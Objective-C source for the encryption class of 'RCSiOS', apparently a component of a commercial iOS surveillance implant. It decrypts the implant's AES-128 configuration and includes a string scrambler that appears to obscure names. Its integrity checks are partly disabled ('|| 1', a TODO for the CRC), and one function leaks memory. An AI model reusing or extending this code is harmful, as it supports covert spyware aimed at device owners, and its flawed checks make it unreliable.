/*
 * RCSiOS - Encryption Class
 *  This class will be responsible for all the Encryption/Decryption routines
 *  used by the Configurator
 * 
 * 
 * Created on 20/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CommonCrypto/CommonDigest.h>
#import <CommonCrypto/CommonCryptor.h>
#import <zlib.h>

#import "RCSICommon.h"
#import "RCSIEncryption.h"
#import "NSMutableData+AES128.h"

//#define DEBUG

#pragma mark -
#pragma mark Private Interface
#pragma mark -

@interface _i_Encryption (hidden)

- (char *)_scrambleString: (char *)aString
                     seed: (u_char)aSeed
            shouldEncrypt: (BOOL)shouldEncrypt;

@end

#pragma mark -
#pragma mark Private Implementation
#pragma mark -

@implementation _i_Encryption (hidden)

- (char *)_scrambleString: (char *)aString
                     seed: (u_char)aSeed
            shouldEncrypt: (BOOL)encryption
{
  char *scrambledString;
  int i, j;
  
  if ( !(scrambledString = strdup(aString)) )
    return NULL;
  
  char alphabet[ALPHABET_LEN] =
    {
    '_','B','q','w','H','a','F','8','T','k','K','D','M',
    'f','O','z','Q','A','S','x','4','V','u','X','d','Z',
    'i','b','U','I','e','y','l','J','W','h','j','0','m',
    '5','o','2','E','r','L','t','6','v','G','R','N','9',
    's','Y','1','n','3','P','p','c','7','g','-','C'
    };
  
  // Avoid leaving aSeed = 0
  aSeed = (aSeed > 0) ? aSeed % ALPHABET_LEN : 1;
  
  for (i = 0; scrambledString[i]; i++)
    {
      for (j = 0; j < ALPHABET_LEN; j++)
        {
          if (scrambledString[i] == alphabet[j])
            {
              if (encryption == YES)
                scrambledString[i] = alphabet[(j + aSeed) % ALPHABET_LEN];
              else
                scrambledString[i] = alphabet[(j + ALPHABET_LEN - aSeed) % ALPHABET_LEN];
              
              break;
            }
        }
    }
  
  return scrambledString;
}

@end

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation _i_Encryption : NSObject

- (id)initWithKey: (NSData *)aKey
{
  self = [super init];
  
  if (self != nil)
    {
      [self setKey: aKey];
    }
  
  return self;
}

- (void)dealloc
{
  [mKey release];
  [super dealloc];
}

- (NSMutableData *)decryptWithKey:(NSData *)aKey
                           inData:(NSMutableData*)inData
{
  NSMutableData *clearData = nil;
  
  size_t numBytesDecrypted = 0;

  CCCryptorStatus result = CCCrypt(kCCDecrypt, 
                                   kCCAlgorithmAES128, 
                                   kCCOptionPKCS7Padding,                   //0,
                                   [aKey bytes], 
                                   kCCKeySizeAES128,
                                   NULL,                                    // initialization vector (optional)
                                   [inData mutableBytes], [inData length],  // input
                                   [inData mutableBytes], [inData length],  // output
                                   &numBytesDecrypted);
  
  if (result == kCCSuccess)
    {
      clearData = [NSMutableData dataWithBytes:[inData bytes] length:numBytesDecrypted];
    }

  return clearData;
}

- (NSData *)decryptJSonConfiguration: (NSString *)aConfigurationFile
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  int maxretry = 0;
  NSData *clearConfig = nil;
   
  if ([[NSFileManager defaultManager] fileExistsAtPath: aConfigurationFile] == FALSE)
    {
      [pool release];
      return clearConfig;
    }
  
  while (clearConfig == nil && maxretry++ < 10) 
    {
      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
    
      NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath: aConfigurationFile];
    
      if (fileHandle != nil)
        {
          NSMutableData *encData = [NSMutableData dataWithData: [fileHandle availableData]];
          
          NSMutableData *tempData = [self decryptWithKey: mKey inData:encData];
        
          if (tempData != nil)
            {
              u_char *confBuffer = (u_char*)[tempData bytes];
              u_int confLen = [tempData length] - CC_SHA1_DIGEST_LENGTH;
              
              u_char *confSha1 = (confBuffer + confLen);
              
              u_char tmpSha1[CC_SHA1_DIGEST_LENGTH+1];
              memset(tmpSha1, 0, sizeof(tmpSha1));

              CC_SHA1(confBuffer, confLen, tmpSha1);
            
              clearConfig = [[NSData dataWithBytes:confBuffer length:confLen] retain];
            
              for (int i=0; i < CC_SHA1_DIGEST_LENGTH; i++) 
                {
                  if (tmpSha1[i] != confSha1[i])
                    {
                      [clearConfig release];
                      clearConfig = nil;
                      break;
                    }
                }
            }
        }
      else
        {
          [inner release];
          break;
        }
    
      [inner release];
    }
  
  [pool release];
  
  return clearConfig;
}

- (NSData *)decryptConfiguration: (NSString *)aConfigurationFile
{
  //
  // Quick Notes about the conf file aka monkeyz stuffz @ 1337
  //  - Skip the first 2 DWORDs
  //  - The third DWORD specifies the length of the data block
  //  - The DWORD at the end of every block is the CRC (including Length)
  //  - The DWORD after the ENDOFCONF Shit is a CRC
  //  |SkipDW|SkipDW|LenDW|DATA...|CRC|
  //
  
  u_int endTokenAndCRCSize = strlen(ENDOF_CONF_DELIMITER) + sizeof(int);
  NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath: aConfigurationFile];
  
  // Hold the first 2 DWORDs since we'll append here the unencrypted file later on
  NSMutableData *fileData = [NSMutableData dataWithData: [fileHandle readDataOfLength: TIMESTAMP_SIZE]];
  
  if (fileData == nil) 
    {
      return nil;
    }
  
  // Skip the first 2 DWORDs
  [fileHandle seekToFileOffset: TIMESTAMP_SIZE];
  //NSLog(@"%@", [fileHandle availableData]);
  
  NSMutableData *tempData = [NSMutableData dataWithData: [fileHandle availableData]];
  CCCryptorStatus result = 0;
  result = [tempData decryptWithKey: mKey];

  // TODO: Handle exceptions on subdataWithRange NSMakeRange, there's a bug on
  // configuration updates, the file won't be written completely so it will be
  // truncated
#ifdef DEBUG_VERBOSE_1
  NSLog(@"result: %d", result);
#endif
  
  if (result == kCCSuccess)
    {
      [fileData appendData: tempData];
#ifdef DEBUG
      NSLog(@"File decrypted correctly");
    
      [fileData writeToFile: @"/private/var/mobile/_i_phone/test.bin" atomically: YES];
#endif
      
      //
      // Integrity checks
      //  - Size
      //  - END Delimeter
      //  - CRC
      //
      u_long readFilesize;
      NSNumber *filesize;
      
      [fileData getBytes: &readFilesize
                   range: NSMakeRange(TIMESTAMP_SIZE, sizeof(int))];
      
      readFilesize += TIMESTAMP_SIZE;
      
      NSDictionary *fileAttributes = [[NSFileManager defaultManager] fileAttributesAtPath: aConfigurationFile
                                                                             traverseLink: YES];
      
      filesize = [fileAttributes objectForKey: NSFileSize];

#ifdef DEBUG_VERBOSE_1
      NSLog(@"timeStamp Size: %d", TIMESTAMP_SIZE);
      NSLog(@"EndTokeAndC_i_ze: %d", endTokenAndCRCSize);
      NSLog(@"readFileSize = %d", readFilesize);
      NSLog(@"attribute = %d", [filesize intValue]);
      NSLog(@"token @ %d", readFilesize - endTokenAndCRCSize);
#endif
      //
      // Why do we need to check the file integrity? Jeez I'm a fool
      // Anyways, there's a problem with one file since we get 3 more bytes
      // than what we expect, thus everything here fails ...
      //
      if ((readFilesize == [filesize intValue]) ||
          (readFilesize + 3 == [filesize intValue]) || 1)
        {
          // endToken should be at EndOfFile - CRC(DWORD) - strlen(TOKEN)
          
          //
          // TODO: Sometimes here we can't find the endToken, thus we're using
          //       now the fileSize attribute instead of the readFileSize
          //
          NSString *endToken = [[NSString alloc] initWithData: [fileData subdataWithRange:
                                                                NSMakeRange(readFilesize - endTokenAndCRCSize,
                                                                            endTokenAndCRCSize - sizeof(int))]
                                                     encoding: NSUTF8StringEncoding];
#ifdef DEBUG_VERBOSE_1
          NSLog(@"EndToken: %@", endToken);
#endif
          
          NSString *endOfConfDel = [[NSString alloc] initWithCString: ENDOF_CONF_DELIMITER
                                                              length: strlen(ENDOF_CONF_DELIMITER)];
          
          if ([endToken isEqualToString: endOfConfDel])
            {
              //
              // TODO: Check the crc (not crc32)
              //
            }
          else
            {
#ifdef DEBUG
              NSLog(@"readFileSize: %d", readFilesize);
              NSLog(@"fileSize: %d", [filesize intValue]);
              
              NSLog(@"[EE] End Token not found");
#endif
              
              [endOfConfDel release];
              
              return nil;
            }
          
          [endOfConfDel release];
        }
      else
        {
#ifdef DEBUG
          NSLog(@"[EE] Configuration file size mismatch");
#endif
          
          return nil;
        }
      
#ifdef DEBUG
      NSLog(@"File decrypted correctly");
#endif
      
      return fileData;
    }
  else
    {
#ifdef DEBUG
      switch (result)
        {
        case kCCParamError:
          NSLog(@"Illegal parameter value");
          break;
        case kCCBufferTooSmall:
          NSLog(@"Insufficent buffer provided for specified operation.");
          break;
        case kCCMemoryFailure:
          NSLog(@"Memory allocation failure.");
          break;
        case kCCAlignmentError:
          NSLog(@"Input size was not aligned properly.");
          break;
        case kCCDecodeError:
          NSLog(@"Input data did not decode or decrypt properly.");
          break;
        case kCCUnimplemented:
          NSLog(@"Function not implemented for the current algorithm.");
          break;
        default:
          NSLog(@"sux");
          break;
        }
#endif
#ifdef DEBUG_VERBOSE_1
      [tempData writeToFile: @"/private/var/mobile/_i_phone/conf_decrypted_with_error.bin" atomically: YES];
#endif
#ifdef DEBUG 
      NSLog(@"Error while decrypting with key");
#endif
    }
  
  return nil;
}

- (NSString *)scrambleForward: (NSString *)aString seed: (u_char)aSeed
{
  char *tempString = [self _scrambleString: (char *)[aString UTF8String]
                                      seed: aSeed
                             shouldEncrypt: YES];
  
  NSString *scrambledString = [[NSString alloc] initWithCString: tempString];
  free(tempString);
  
  return [scrambledString autorelease];
}

- (NSString *)scrambleBackward: (NSString *)aString seed: (u_char)aSeed
{
  char *tempString = [self _scrambleString: (char *)[aString UTF8String]
                                      seed: aSeed
                             shouldEncrypt: NO];
  
  NSString *scrambledString = [[NSString alloc] initWithCString: tempString];
  
  return [scrambledString autorelease];
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSData *)mKey
{
  return mKey;
}

- (void)setKey: (NSData *)aValue
{
  if (aValue != mKey)
    {
      [mKey release];
      mKey = [aValue retain];
    }
}

@end